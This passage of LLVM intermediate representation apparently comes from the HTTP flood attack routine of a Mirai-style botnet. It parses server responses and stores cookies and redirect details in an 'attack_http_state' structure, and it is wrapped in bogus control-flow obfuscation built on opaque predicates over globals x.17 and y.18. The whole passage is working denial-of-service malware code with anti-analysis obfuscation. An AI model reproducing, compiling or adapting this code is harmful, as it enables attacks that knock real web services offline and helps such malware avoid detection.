  store i32 %1723, i32* %39, align 4
  br label %1724

; <label>:1724:                                   ; preds = %1721, %1715
  %1725 = load i32, i32* %38, align 4
  %1726 = load i32, i32* %39, align 4
  %1727 = add nsw i32 %1725, %1726
  %1728 = sext i32 %1727 to i64
  %1729 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1728
  store i8 0, i8* %1729, align 1
  %1730 = load i8*, i8** %40, align 8
  %1731 = load i8*, i8** %40, align 8
  %1732 = call i32 @util_strlen(i8* %1731)
  %1733 = call i8* @table_retrieve_val(i32 59, i32* null)
  %1734 = call i32 @util_stristr(i8* %1730, i32 %1732, i8* %1733)
  %1735 = icmp ne i32 %1734, 0
  br i1 %1735, label %1736, label %1739

; <label>:1736:                                   ; preds = %1724
  %1737 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1738 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1737, i32 0, i32 12
  store i32 1, i32* %1738, align 4
  br label %1739

; <label>:1739:                                   ; preds = %1736, %1724
  %1740 = load i32, i32* @x.17
  %1741 = load i32, i32* @y.18
  %1742 = sub i32 %1740, 1
  %1743 = mul i32 %1740, %1742
  %1744 = urem i32 %1743, 2
  %1745 = icmp eq i32 %1744, 0
  %1746 = icmp slt i32 %1741, 10
  %1747 = or i1 %1745, %1746
  br i1 %1747, label %originalBB298, label %originalBB298alteredBB

originalBB298:                                    ; preds = %originalBB298alteredBB, %1739
  %1748 = load i32, i32* @x.17
  %1749 = load i32, i32* @y.18
  %1750 = sub i32 %1748, 1
  %1751 = mul i32 %1748, %1750
  %1752 = urem i32 %1751, 2
  %1753 = icmp eq i32 %1752, 0
  %1754 = icmp slt i32 %1749, 10
  %1755 = or i1 %1753, %1754
  br i1 %1755, label %originalBBpart2300, label %originalBB298alteredBB

originalBBpart2300:                               ; preds = %originalBB298
  br label %1756

; <label>:1756:                                   ; preds = %originalBBpart2300, %1704
  br label %1757

; <label>:1757:                                   ; preds = %1756, %1682
  %1758 = load i32, i32* @x.17
  %1759 = load i32, i32* @y.18
  %1760 = sub i32 %1758, 1
  %1761 = mul i32 %1758, %1760
  %1762 = urem i32 %1761, 2
  %1763 = icmp eq i32 %1762, 0
  %1764 = icmp slt i32 %1759, 10
  %1765 = or i1 %1763, %1764
  br i1 %1765, label %originalBB302, label %originalBB302alteredBB

originalBB302:                                    ; preds = %originalBB302alteredBB, %1757
  %1766 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1767 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1766, i32 0, i32 13
  store i32 0, i32* %1767, align 4
  %1768 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1769 = load i32, i32* %12, align 4
  %1770 = call i8* @table_retrieve_val(i32 57, i32* null)
  %1771 = call i32 @util_stristr(i8* %1768, i32 %1769, i8* %1770)
  %1772 = icmp ne i32 %1771, -1
  %1773 = load i32, i32* @x.17
  %1774 = load i32, i32* @y.18
  %1775 = sub i32 %1773, 1
  %1776 = mul i32 %1773, %1775
  %1777 = urem i32 %1776, 2
  %1778 = icmp eq i32 %1777, 0
  %1779 = icmp slt i32 %1774, 10
  %1780 = or i1 %1778, %1779
  br i1 %1780, label %originalBBpart2304, label %originalBB302alteredBB

originalBBpart2304:                               ; preds = %originalBB302
  br i1 %1772, label %1781, label %1848

; <label>:1781:                                   ; preds = %originalBBpart2304
  %1782 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1783 = load i32, i32* %12, align 4
  %1784 = call i8* @table_retrieve_val(i32 57, i32* null)
  %1785 = call i32 @util_stristr(i8* %1782, i32 %1783, i8* %1784)
  store i32 %1785, i32* %41, align 4
  %1786 = load i32, i32* %41, align 4
  %1787 = sext i32 %1786 to i64
  %1788 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1787
  %1789 = load i8, i8* %1788, align 1
  %1790 = sext i8 %1789 to i32
  %1791 = icmp eq i32 %1790, 32
  br i1 %1791, label %1792, label %1795

; <label>:1792:                                   ; preds = %1781
  %1793 = load i32, i32* %41, align 4
  %1794 = add nsw i32 %1793, 1
  store i32 %1794, i32* %41, align 4
  br label %1795

; <label>:1795:                                   ; preds = %1792, %1781
  %1796 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1797 = load i32, i32* %41, align 4
  %1798 = sext i32 %1797 to i64
  %1799 = getelementptr inbounds i8, i8* %1796, i64 %1798
  %1800 = load i32, i32* %12, align 4
  %1801 = load i32, i32* %41, align 4
  %1802 = sub nsw i32 %1800, %1801
  %1803 = call i32 @util_memsearch(i8* %1799, i32 %1802, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1803, i32* %42, align 4
  %1804 = load i32, i32* %42, align 4
  %1805 = icmp ne i32 %1804, -1
  br i1 %1805, label %1806, label %1831

; <label>:1806:                                   ; preds = %1795
  %1807 = load i32, i32* %41, align 4
  %1808 = sext i32 %1807 to i64
  %1809 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1808
  store i8* %1809, i8** %43, align 8
  %1810 = load i32, i32* %42, align 4
  %1811 = icmp sge i32 %1810, 2
  br i1 %1811, label %1812, label %1815

; <label>:1812:                                   ; preds = %1806
  %1813 = load i32, i32* %42, align 4
  %1814 = sub nsw i32 %1813, 2
  store i32 %1814, i32* %42, align 4
  br label %1815

; <label>:1815:                                   ; preds = %1812, %1806
  %1816 = load i32, i32* %41, align 4
  %1817 = load i32, i32* %42, align 4
  %1818 = add nsw i32 %1816, %1817
  %1819 = sext i32 %1818 to i64
  %1820 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1819
  store i8 0, i8* %1820, align 1
  %1821 = load i8*, i8** %43, align 8
  %1822 = load i8*, i8** %43, align 8
  %1823 = call i32 @util_strlen(i8* %1822)
  %1824 = call i8* @table_retrieve_val(i32 58, i32* null)
  %1825 = call i32 @util_stristr(i8* %1821, i32 %1823, i8* %1824)
  %1826 = icmp ne i32 %1825, 0
  br i1 %1826, label %1827, label %1830

; <label>:1827:                                   ; preds = %1815
  %1828 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1829 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1828, i32 0, i32 13
  store i32 1, i32* %1829, align 4
  br label %1830

; <label>:1830:                                   ; preds = %1827, %1815
  br label %1831

; <label>:1831:                                   ; preds = %1830, %1795
  %1832 = load i32, i32* @x.17
  %1833 = load i32, i32* @y.18
  %1834 = sub i32 %1832, 1
  %1835 = mul i32 %1832, %1834
  %1836 = urem i32 %1835, 2
  %1837 = icmp eq i32 %1836, 0
  %1838 = icmp slt i32 %1833, 10
  %1839 = or i1 %1837, %1838
  br i1 %1839, label %originalBB306, label %originalBB306alteredBB

originalBB306:                                    ; preds = %originalBB306alteredBB, %1831
  %1840 = load i32, i32* @x.17
  %1841 = load i32, i32* @y.18
  %1842 = sub i32 %1840, 1
  %1843 = mul i32 %1840, %1842
  %1844 = urem i32 %1843, 2
  %1845 = icmp eq i32 %1844, 0
  %1846 = icmp slt i32 %1841, 10
  %1847 = or i1 %1845, %1846
  br i1 %1847, label %originalBBpart2308, label %originalBB306alteredBB

originalBBpart2308:                               ; preds = %originalBB306
  br label %1848

; <label>:1848:                                   ; preds = %originalBBpart2308, %originalBBpart2304
  %1849 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1850 = load i32, i32* %12, align 4
  %1851 = call i8* @table_retrieve_val(i32 56, i32* null)
  %1852 = call i32 @util_stristr(i8* %1849, i32 %1850, i8* %1851)
  %1853 = icmp ne i32 %1852, -1
  br i1 %1853, label %1854, label %1931

; <label>:1854:                                   ; preds = %1848
  %1855 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1856 = load i32, i32* %12, align 4
  %1857 = call i8* @table_retrieve_val(i32 56, i32* null)
  %1858 = call i32 @util_stristr(i8* %1855, i32 %1856, i8* %1857)
  store i32 %1858, i32* %44, align 4
  %1859 = load i32, i32* %44, align 4
  %1860 = sext i32 %1859 to i64
  %1861 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1860
  %1862 = load i8, i8* %1861, align 1
  %1863 = sext i8 %1862 to i32
  %1864 = icmp eq i32 %1863, 32
  br i1 %1864, label %1865, label %1868

; <label>:1865:                                   ; preds = %1854
  %1866 = load i32, i32* %44, align 4
  %1867 = add nsw i32 %1866, 1
  store i32 %1867, i32* %44, align 4
  br label %1868

; <label>:1868:                                   ; preds = %1865, %1854
  %1869 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1870 = load i32, i32* %44, align 4
  %1871 = sext i32 %1870 to i64
  %1872 = getelementptr inbounds i8, i8* %1869, i64 %1871
  %1873 = load i32, i32* %12, align 4
  %1874 = load i32, i32* %44, align 4
  %1875 = sub nsw i32 %1873, %1874
  %1876 = call i32 @util_memsearch(i8* %1872, i32 %1875, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1876, i32* %45, align 4
  %1877 = load i32, i32* %45, align 4
  %1878 = icmp ne i32 %1877, -1
  br i1 %1878, label %1879, label %1930

; <label>:1879:                                   ; preds = %1868
  %1880 = load i32, i32* @x.17
  %1881 = load i32, i32* @y.18
  %1882 = sub i32 %1880, 1
  %1883 = mul i32 %1880, %1882
  %1884 = urem i32 %1883, 2
  %1885 = icmp eq i32 %1884, 0
  %1886 = icmp slt i32 %1881, 10
  %1887 = or i1 %1885, %1886
  br i1 %1887, label %originalBB310, label %originalBB310alteredBB

originalBB310:                                    ; preds = %originalBB310alteredBB, %1879
  %1888 = load i32, i32* %44, align 4
  %1889 = sext i32 %1888 to i64
  %1890 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1889
  store i8* %1890, i8** %46, align 8
  %1891 = load i32, i32* %45, align 4
  %1892 = icmp sge i32 %1891, 2
  %1893 = load i32, i32* @x.17
  %1894 = load i32, i32* @y.18
  %1895 = sub i32 %1893, 1
  %1896 = mul i32 %1893, %1895
  %1897 = urem i32 %1896, 2
  %1898 = icmp eq i32 %1897, 0
  %1899 = icmp slt i32 %1894, 10
  %1900 = or i1 %1898, %1899
  br i1 %1900, label %originalBBpart2312, label %originalBB310alteredBB

originalBBpart2312:                               ; preds = %originalBB310
  br i1 %1892, label %1901, label %1920

; <label>:1901:                                   ; preds = %originalBBpart2312
  %1902 = load i32, i32* @x.17
  %1903 = load i32, i32* @y.18
  %1904 = sub i32 %1902, 1
  %1905 = mul i32 %1902, %1904
  %1906 = urem i32 %1905, 2
  %1907 = icmp eq i32 %1906, 0
  %1908 = icmp slt i32 %1903, 10
  %1909 = or i1 %1907, %1908
  br i1 %1909, label %originalBB314, label %originalBB314alteredBB

originalBB314:                                    ; preds = %originalBB314alteredBB, %1901
  %1910 = load i32, i32* %45, align 4
  %1911 = sub nsw i32 %1910, 2
  store i32 %1911, i32* %45, align 4
  %1912 = load i32, i32* @x.17
  %1913 = load i32, i32* @y.18
  %1914 = sub i32 %1912, 1
  %1915 = mul i32 %1912, %1914
  %1916 = urem i32 %1915, 2
  %1917 = icmp eq i32 %1916, 0
  %1918 = icmp slt i32 %1913, 10
  %1919 = or i1 %1917, %1918
  br i1 %1919, label %originalBBpart2320, label %originalBB314alteredBB

originalBBpart2320:                               ; preds = %originalBB314
  br label %1920

; <label>:1920:                                   ; preds = %originalBBpart2320, %originalBBpart2312
  %1921 = load i32, i32* %44, align 4
  %1922 = load i32, i32* %45, align 4
  %1923 = add nsw i32 %1921, %1922
  %1924 = sext i32 %1923 to i64
  %1925 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1924
  store i8 0, i8* %1925, align 1
  %1926 = load i8*, i8** %46, align 8
  %1927 = call i32 @util_atoi(i8* %1926, i32 10)
  %1928 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1929 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1928, i32 0, i32 14
  store i32 %1927, i32* %1929, align 4
  br label %1930

; <label>:1930:                                   ; preds = %1920, %1868
  br label %1950

; <label>:1931:                                   ; preds = %1848
  %1932 = load i32, i32* @x.17
  %1933 = load i32, i32* @y.18
  %1934 = sub i32 %1932, 1
  %1935 = mul i32 %1932, %1934
  %1936 = urem i32 %1935, 2
  %1937 = icmp eq i32 %1936, 0
  %1938 = icmp slt i32 %1933, 10
  %1939 = or i1 %1937, %1938
  br i1 %1939, label %originalBB322, label %originalBB322alteredBB

originalBB322:                                    ; preds = %originalBB322alteredBB, %1931
  %1940 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1941 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1940, i32 0, i32 14
  store i32 0, i32* %1941, align 4
  %1942 = load i32, i32* @x.17
  %1943 = load i32, i32* @y.18
  %1944 = sub i32 %1942, 1
  %1945 = mul i32 %1942, %1944
  %1946 = urem i32 %1945, 2
  %1947 = icmp eq i32 %1946, 0
  %1948 = icmp slt i32 %1943, 10
  %1949 = or i1 %1947, %1948
  br i1 %1949, label %originalBBpart2324, label %originalBB322alteredBB

originalBBpart2324:                               ; preds = %originalBB322
  br label %1950

; <label>:1950:                                   ; preds = %originalBBpart2324, %1930
  %1951 = load i32, i32* @x.17
  %1952 = load i32, i32* @y.18
  %1953 = sub i32 %1951, 1
  %1954 = mul i32 %1951, %1953
  %1955 = urem i32 %1954, 2
  %1956 = icmp eq i32 %1955, 0
  %1957 = icmp slt i32 %1952, 10
  %1958 = or i1 %1956, %1957
  br i1 %1958, label %originalBB326, label %originalBB326alteredBB

originalBB326:                                    ; preds = %originalBB326alteredBB, %1950
  store i32 0, i32* %37, align 4
  %1959 = load i32, i32* @x.17
  %1960 = load i32, i32* @y.18
  %1961 = sub i32 %1959, 1
  %1962 = mul i32 %1959, %1961
  %1963 = urem i32 %1962, 2
  %1964 = icmp eq i32 %1963, 0
  %1965 = icmp slt i32 %1960, 10
  %1966 = or i1 %1964, %1965
  br i1 %1966, label %originalBBpart2328, label %originalBB326alteredBB

originalBBpart2328:                               ; preds = %originalBB326
  br label %1967

; <label>:1967:                                   ; preds = %2254, %originalBBpart2328
  %1968 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1969 = load i32, i32* %37, align 4
  %1970 = sext i32 %1969 to i64
  %1971 = getelementptr inbounds i8, i8* %1968, i64 %1970
  %1972 = load i32, i32* %12, align 4
  %1973 = call i8* @table_retrieve_val(i32 55, i32* null)
  %1974 = call i32 @util_stristr(i8* %1971, i32 %1972, i8* %1973)
  %1975 = icmp ne i32 %1974, -1
  br i1 %1975, label %1976, label %1981

; <label>:1976:                                   ; preds = %1967
  %1977 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1978 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1977, i32 0, i32 15
  %1979 = load i32, i32* %1978, align 4
  %1980 = icmp slt i32 %1979, 5
  br label %1981

; <label>:1981:                                   ; preds = %1976, %1967
  %1982 = phi i1 [ false, %1967 ], [ %1980, %1976 ]
  br i1 %1982, label %1983, label %2258

; <label>:1983:                                   ; preds = %1981
  %1984 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1985 = load i32, i32* %37, align 4
  %1986 = sext i32 %1985 to i64
  %1987 = getelementptr inbounds i8, i8* %1984, i64 %1986
  %1988 = load i32, i32* %12, align 4
  %1989 = call i8* @table_retrieve_val(i32 55, i32* null)
  %1990 = call i32 @util_stristr(i8* %1987, i32 %1988, i8* %1989)
  store i32 %1990, i32* %47, align 4
  %1991 = load i32, i32* %37, align 4
  %1992 = load i32, i32* %47, align 4
  %1993 = add nsw i32 %1991, %1992
  %1994 = sext i32 %1993 to i64
  %1995 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1994
  %1996 = load i8, i8* %1995, align 1
  %1997 = sext i8 %1996 to i32
  %1998 = icmp eq i32 %1997, 32
  br i1 %1998, label %1999, label %2002

; <label>:1999:                                   ; preds = %1983
  %2000 = load i32, i32* %47, align 4
  %2001 = add nsw i32 %2000, 1
  store i32 %2001, i32* %47, align 4
  br label %2002

; <label>:2002:                                   ; preds = %1999, %1983
  %2003 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2004 = load i32, i32* %37, align 4
  %2005 = sext i32 %2004 to i64
  %2006 = getelementptr inbounds i8, i8* %2003, i64 %2005
  %2007 = load i32, i32* %47, align 4
  %2008 = sext i32 %2007 to i64
  %2009 = getelementptr inbounds i8, i8* %2006, i64 %2008
  %2010 = load i32, i32* %12, align 4
  %2011 = load i32, i32* %37, align 4
  %2012 = sub nsw i32 %2010, %2011
  %2013 = load i32, i32* %47, align 4
  %2014 = sub nsw i32 %2012, %2013
  %2015 = call i32 @util_memsearch(i8* %2009, i32 %2014, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2015, i32* %48, align 4
  %2016 = load i32, i32* %48, align 4
  %2017 = icmp ne i32 %2016, -1
  br i1 %2017, label %2018, label %2254

; <label>:2018:                                   ; preds = %2002
  %2019 = load i32, i32* %37, align 4
  %2020 = load i32, i32* %47, align 4
  %2021 = add nsw i32 %2019, %2020
  %2022 = sext i32 %2021 to i64
  %2023 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2022
  store i8* %2023, i8** %49, align 8
  %2024 = load i32, i32* %48, align 4
  %2025 = icmp sge i32 %2024, 2
  br i1 %2025, label %2026, label %2029

; <label>:2026:                                   ; preds = %2018
  %2027 = load i32, i32* %48, align 4
  %2028 = sub nsw i32 %2027, 2
  store i32 %2028, i32* %48, align 4
  br label %2029

; <label>:2029:                                   ; preds = %2026, %2018
  %2030 = load i32, i32* @x.17
  %2031 = load i32, i32* @y.18
  %2032 = sub i32 %2030, 1
  %2033 = mul i32 %2030, %2032
  %2034 = urem i32 %2033, 2
  %2035 = icmp eq i32 %2034, 0
  %2036 = icmp slt i32 %2031, 10
  %2037 = or i1 %2035, %2036
  br i1 %2037, label %originalBB330, label %originalBB330alteredBB

originalBB330:                                    ; preds = %originalBB330alteredBB, %2029
  %2038 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2039 = load i32, i32* %37, align 4
  %2040 = sext i32 %2039 to i64
  %2041 = getelementptr inbounds i8, i8* %2038, i64 %2040
  %2042 = load i32, i32* %47, align 4
  %2043 = sext i32 %2042 to i64
  %2044 = getelementptr inbounds i8, i8* %2041, i64 %2043
  %2045 = load i32, i32* %12, align 4
  %2046 = load i32, i32* %37, align 4
  %2047 = sub nsw i32 %2045, %2046
  %2048 = load i32, i32* %47, align 4
  %2049 = sub nsw i32 %2047, %2048
  %2050 = call i32 @util_memsearch(i8* %2044, i32 %2049, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2051 = icmp sgt i32 %2050, 0
  %2052 = load i32, i32* @x.17
  %2053 = load i32, i32* @y.18
  %2054 = sub i32 %2052, 1
  %2055 = mul i32 %2052, %2054
  %2056 = urem i32 %2055, 2
  %2057 = icmp eq i32 %2056, 0
  %2058 = icmp slt i32 %2053, 10
  %2059 = or i1 %2057, %2058
  br i1 %2059, label %originalBBpart2354, label %originalBB330alteredBB

originalBBpart2354:                               ; preds = %originalBB330
  br i1 %2051, label %2060, label %2075

; <label>:2060:                                   ; preds = %originalBBpart2354
  %2061 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2062 = load i32, i32* %37, align 4
  %2063 = sext i32 %2062 to i64
  %2064 = getelementptr inbounds i8, i8* %2061, i64 %2063
  %2065 = load i32, i32* %47, align 4
  %2066 = sext i32 %2065 to i64
  %2067 = getelementptr inbounds i8, i8* %2064, i64 %2066
  %2068 = load i32, i32* %12, align 4
  %2069 = load i32, i32* %37, align 4
  %2070 = sub nsw i32 %2068, %2069
  %2071 = load i32, i32* %47, align 4
  %2072 = sub nsw i32 %2070, %2071
  %2073 = call i32 @util_memsearch(i8* %2067, i32 %2072, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2074 = sub nsw i32 %2073, 1
  store i32 %2074, i32* %48, align 4
  br label %2075

; <label>:2075:                                   ; preds = %2060, %originalBBpart2354
  %2076 = load i32, i32* %37, align 4
  %2077 = load i32, i32* %47, align 4
  %2078 = add nsw i32 %2076, %2077
  %2079 = load i32, i32* %48, align 4
  %2080 = add nsw i32 %2078, %2079
  %2081 = sext i32 %2080 to i64
  %2082 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2081
  store i8 0, i8* %2082, align 1
  store i32 0, i32* %10, align 4
  br label %2083

; <label>:2083:                                   ; preds = %2098, %2075
  %2084 = load i32, i32* %10, align 4
  %2085 = load i8*, i8** %49, align 8
  %2086 = call i32 @util_strlen(i8* %2085)
  %2087 = icmp slt i32 %2084, %2086
  br i1 %2087, label %2088, label %2101

; <label>:2088:                                   ; preds = %2083
  %2089 = load i8*, i8** %49, align 8
  %2090 = load i32, i32* %10, align 4
  %2091 = sext i32 %2090 to i64
  %2092 = getelementptr inbounds i8, i8* %2089, i64 %2091
  %2093 = load i8, i8* %2092, align 1
  %2094 = sext i8 %2093 to i32
  %2095 = icmp eq i32 %2094, 61
  br i1 %2095, label %2096, label %2097

; <label>:2096:                                   ; preds = %2088
  br label %2101

; <label>:2097:                                   ; preds = %2088
  br label %2098

; <label>:2098:                                   ; preds = %2097
  %2099 = load i32, i32* %10, align 4
  %2100 = add nsw i32 %2099, 1
  store i32 %2100, i32* %10, align 4
  br label %2083

; <label>:2101:                                   ; preds = %2096, %2083
  %2102 = load i32, i32* @x.17
  %2103 = load i32, i32* @y.18
  %2104 = sub i32 %2102, 1
  %2105 = mul i32 %2102, %2104
  %2106 = urem i32 %2105, 2
  %2107 = icmp eq i32 %2106, 0
  %2108 = icmp slt i32 %2103, 10
  %2109 = or i1 %2107, %2108
  br i1 %2109, label %originalBB356, label %originalBB356alteredBB

originalBB356:                                    ; preds = %originalBB356alteredBB, %2101
  %2110 = load i8*, i8** %49, align 8
  %2111 = load i32, i32* %10, align 4
  %2112 = sext i32 %2111 to i64
  %2113 = getelementptr inbounds i8, i8* %2110, i64 %2112
  %2114 = load i8, i8* %2113, align 1
  %2115 = sext i8 %2114 to i32
  %2116 = icmp eq i32 %2115, 61
  %2117 = load i32, i32* @x.17
  %2118 = load i32, i32* @y.18
  %2119 = sub i32 %2117, 1
  %2120 = mul i32 %2117, %2119
  %2121 = urem i32 %2120, 2
  %2122 = icmp eq i32 %2121, 0
  %2123 = icmp slt i32 %2118, 10
  %2124 = or i1 %2122, %2123
  br i1 %2124, label %originalBBpart2358, label %originalBB356alteredBB

originalBBpart2358:                               ; preds = %originalBB356
  br i1 %2116, label %2125, label %2237

; <label>:2125:                                   ; preds = %originalBBpart2358
  %2126 = load i32, i32* @x.17
  %2127 = load i32, i32* @y.18
  %2128 = sub i32 %2126, 1
  %2129 = mul i32 %2126, %2128
  %2130 = urem i32 %2129, 2
  %2131 = icmp eq i32 %2130, 0
  %2132 = icmp slt i32 %2127, 10
  %2133 = or i1 %2131, %2132
  br i1 %2133, label %originalBB360, label %originalBB360alteredBB

originalBB360:                                    ; preds = %originalBB360alteredBB, %2125
  %2134 = load i32, i32* %10, align 4
  store i32 %2134, i32* %50, align 4
  store i32 0, i32* %51, align 4
  store i32 0, i32* %10, align 4
  %2135 = load i32, i32* @x.17
  %2136 = load i32, i32* @y.18
  %2137 = sub i32 %2135, 1
  %2138 = mul i32 %2135, %2137
  %2139 = urem i32 %2138, 2
  %2140 = icmp eq i32 %2139, 0
  %2141 = icmp slt i32 %2136, 10
  %2142 = or i1 %2140, %2141
  br i1 %2142, label %originalBBpart2362, label %originalBB360alteredBB

originalBBpart2362:                               ; preds = %originalBB360
  br label %2143

; <label>:2143:                                   ; preds = %2194, %originalBBpart2362
  %2144 = load i32, i32* %10, align 4
  %2145 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2146 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2145, i32 0, i32 15
  %2147 = load i32, i32* %2146, align 4
  %2148 = icmp slt i32 %2144, %2147
  br i1 %2148, label %2149, label %2197

; <label>:2149:                                   ; preds = %2143
  %2150 = load i32, i32* @x.17
  %2151 = load i32, i32* @y.18
  %2152 = sub i32 %2150, 1
  %2153 = mul i32 %2150, %2152
  %2154 = urem i32 %2153, 2
  %2155 = icmp eq i32 %2154, 0
  %2156 = icmp slt i32 %2151, 10
  %2157 = or i1 %2155, %2156
  br i1 %2157, label %originalBB364, label %originalBB364alteredBB

originalBB364:                                    ; preds = %originalBB364alteredBB, %2149
  %2158 = load i8*, i8** %49, align 8
  %2159 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2160 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2159, i32 0, i32 16
  %2161 = load i32, i32* %10, align 4
  %2162 = sext i32 %2161 to i64
  %2163 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2160, i64 0, i64 %2162
  %2164 = getelementptr inbounds [128 x i8], [128 x i8]* %2163, i32 0, i32 0
  %2165 = load i32, i32* %50, align 4
  %2166 = call signext i8 @util_strncmp(i8* %2158, i8* %2164, i32 %2165)
  %2167 = icmp ne i8 %2166, 0
  %2168 = load i32, i32* @x.17
  %2169 = load i32, i32* @y.18
  %2170 = sub i32 %2168, 1
  %2171 = mul i32 %2168, %2170
  %2172 = urem i32 %2171, 2
  %2173 = icmp eq i32 %2172, 0
  %2174 = icmp slt i32 %2169, 10
  %2175 = or i1 %2173, %2174
  br i1 %2175, label %originalBBpart2366, label %originalBB364alteredBB

originalBBpart2366:                               ; preds = %originalBB364
  br i1 %2167, label %2176, label %2193

; <label>:2176:                                   ; preds = %originalBBpart2366
  %2177 = load i32, i32* @x.17
  %2178 = load i32, i32* @y.18
  %2179 = sub i32 %2177, 1
  %2180 = mul i32 %2177, %2179
  %2181 = urem i32 %2180, 2
  %2182 = icmp eq i32 %2181, 0
  %2183 = icmp slt i32 %2178, 10
  %2184 = or i1 %2182, %2183
  br i1 %2184, label %originalBB368, label %originalBB368alteredBB

originalBB368:                                    ; preds = %originalBB368alteredBB, %2176
  store i32 1, i32* %51, align 4
  %2185 = load i32, i32* @x.17
  %2186 = load i32, i32* @y.18
  %2187 = sub i32 %2185, 1
  %2188 = mul i32 %2185, %2187
  %2189 = urem i32 %2188, 2
  %2190 = icmp eq i32 %2189, 0
  %2191 = icmp slt i32 %2186, 10
  %2192 = or i1 %2190, %2191
  br i1 %2192, label %originalBBpart2370, label %originalBB368alteredBB

originalBBpart2370:                               ; preds = %originalBB368
  br label %2197

; <label>:2193:                                   ; preds = %originalBBpart2366
  br label %2194

; <label>:2194:                                   ; preds = %2193
  %2195 = load i32, i32* %10, align 4
  %2196 = add nsw i32 %2195, 1
  store i32 %2196, i32* %10, align 4
  br label %2143

; <label>:2197:                                   ; preds = %originalBBpart2370, %2143
  %2198 = load i32, i32* @x.17
  %2199 = load i32, i32* @y.18
  %2200 = sub i32 %2198, 1
  %2201 = mul i32 %2198, %2200
  %2202 = urem i32 %2201, 2
  %2203 = icmp eq i32 %2202, 0
  %2204 = icmp slt i32 %2199, 10
  %2205 = or i1 %2203, %2204
  br i1 %2205, label %originalBB372, label %originalBB372alteredBB

originalBB372:                                    ; preds = %originalBB372alteredBB, %2197
  %2206 = load i32, i32* %51, align 4
  %2207 = icmp ne i32 %2206, 0
  %2208 = load i32, i32* @x.17
  %2209 = load i32, i32* @y.18
  %2210 = sub i32 %2208, 1
  %2211 = mul i32 %2208, %2210
  %2212 = urem i32 %2211, 2
  %2213 = icmp eq i32 %2212, 0
  %2214 = icmp slt i32 %2209, 10
  %2215 = or i1 %2213, %2214
  br i1 %2215, label %originalBBpart2374, label %originalBB372alteredBB

originalBBpart2374:                               ; preds = %originalBB372
  br i1 %2207, label %2236, label %2216

; <label>:2216:                                   ; preds = %originalBBpart2374
  %2217 = load i8*, i8** %49, align 8
  %2218 = call i32 @util_strlen(i8* %2217)
  %2219 = icmp slt i32 %2218, 128
  br i1 %2219, label %2220, label %2235

; <label>:2220:                                   ; preds = %2216
  %2221 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2222 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2221, i32 0, i32 16
  %2223 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2224 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2223, i32 0, i32 15
  %2225 = load i32, i32* %2224, align 4
  %2226 = sext i32 %2225 to i64
  %2227 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2222, i64 0, i64 %2226
  %2228 = getelementptr inbounds [128 x i8], [128 x i8]* %2227, i32 0, i32 0
  %2229 = load i8*, i8** %49, align 8
  %2230 = call i32 @util_strcpy(i8* %2228, i8* %2229)
  %2231 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2232 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2231, i32 0, i32 15
  %2233 = load i32, i32* %2232, align 4
  %2234 = add nsw i32 %2233, 1
  store i32 %2234, i32* %2232, align 4
  br label %2235

; <label>:2235:                                   ; preds = %2220, %2216
